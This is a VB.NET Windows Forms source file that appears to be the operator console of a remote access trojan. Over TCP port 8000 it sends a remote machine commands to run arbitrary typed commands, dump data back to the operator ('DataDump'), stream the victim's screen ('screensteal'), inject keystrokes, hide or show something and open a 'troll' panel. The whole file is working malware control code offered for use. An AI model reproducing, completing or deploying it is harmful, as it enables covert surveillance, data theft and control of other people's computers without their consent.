Option Explicit On
Imports System.IO
Imports System.Net.Sockets

Public Class tools
    Dim Client As TcpClient
    Dim strHostName As String = System.Net.Dns.GetHostName()
    Dim MyLocIp As String = System.Net.Dns.GetHostByName(strHostName).AddressList(0).ToString()

    Private Sub Button1_Click_1(sender As Object, e As EventArgs) Handles Button1.Click
        Try
            Client = New TcpClient(Label2.Text, 8000)
            Dim Writer As New StreamWriter(Client.GetStream())
            Writer.Write("</> " & TextBox1.Text & " <\>")
            Writer.Flush()
            RichTextBox1.Text = RichTextBox1.Text + Environment.NewLine + "Command sent: " + TextBox1.Text
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs)
        rec.Show()
        Try
            Client = New TcpClient(Label2.Text, 8000)
            Dim Writer As New StreamWriter(Client.GetStream())
            Writer.Write("</> " & "DataDump " + MyLocIp & "<\>")
            Writer.Flush()

        Catch ex As Exception
            MsgBox(ex.Message)
        End Try

    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Try
            Client = New TcpClient(Label2.Text, 8000)
            Dim Writer As New StreamWriter(Client.GetStream())
            Writer.Write("</> " & "screensteal" & MyLocIp & " <\>")
            Writer.Flush()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
        RichTextBox1.Text = RichTextBox1.Text + Environment.NewLine + "Screen watching started"
        ScreenSteal.Show()
        ScreenSteal.Start()

    End Sub
    Function stopscreen()
        Try
            Client = New TcpClient(Label2.Text, 8000)
            Dim Writer As New StreamWriter(Client.GetStream())
            Writer.Write("</> " & "stopscreen" & " <\>")
            Writer.Flush()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Function

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        Try
            Client = New TcpClient(Label2.Text, 8000)
            Dim Writer As New StreamWriter(Client.GetStream())
            Writer.Write("mh1")
            Writer.Flush()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        Try
            Client = New TcpClient(Label2.Text, 8000)
            Dim Writer As New StreamWriter(Client.GetStream())
            Writer.Write("mh1hide")
            Writer.Flush()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub GroupBox1_Enter(sender As Object, e As EventArgs) Handles GroupBox1.Enter

    End Sub

    Private Sub tools_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        RichTextBox1.Text = "Connected"
    End Sub


    Function send(KEY)
        Try
            Client = New TcpClient(Label2.Text, 8000)
            Dim Writer As New StreamWriter(Client.GetStream())
            Writer.Write("</> " & "KEYSEND" & KEY & " <\>")
            Writer.Flush()
            RichTextBox1.Text = RichTextBox1.Text + Environment.NewLine + "Command sent: " + TextBox1.Text
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Function

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        TrollMs.Show()

    End Sub

    Private Sub Button2_Click_1(sender As Object, e As EventArgs) Handles Button2.Click
        Commands.Show()
    End Sub

    Private Sub GroupBox2_Enter(sender As Object, e As EventArgs) Handles GroupBox2.Enter

    End Sub
End Class